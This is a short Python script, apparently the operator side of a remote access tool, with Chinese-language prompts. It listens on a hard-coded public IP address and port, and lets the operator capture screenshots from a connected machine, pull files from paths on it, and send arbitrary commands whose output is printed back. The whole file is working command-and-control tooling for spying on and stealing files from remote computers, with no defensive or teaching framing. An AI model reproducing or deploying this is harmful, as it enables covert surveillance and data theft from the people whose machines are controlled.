import socket
from PIL import Image
global n
n=0
def filename():
    global n
    n+=1
    return str(n)+'.jpg'
def main():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    host="66.42.75.46"
    port=9999
    s.bind((host,port))
    s.listen(5)
    while True:
        s1,addr=s.accept()
        print("链接地址是:",addr)
        while True:
            option=input("请输入:")
            if option=='stop':
               return 0
            elif option=='shot':
                s1.send(option.encode("utf-8"))
                im=s1.recv(1024*1024)
                file_name=filename()
                with open(file_name,'wb') as f:
                    f.write(im)
                img=Image.open(file_name)
                img.show()
            elif option=='tran':
                s1.send(option.encode("utf-8"))
                file_name=input("请输入文件名:")
                file_path=input("请输入文件路径:")
                s1.send(file_path.encode("utf-8"))
                docu=s1.recv(1024*1024)
                with open(file_name,'wb') as f:
                    f.write(docu)
            else:
                s1.send(option.encode("utf-8"))
                data_recv=s1.recv(1024*1024).decode("utf-8")
                print(data_recv)
        s1.close()
    s.close()
    pass

if __name__ == '__main__':
    main()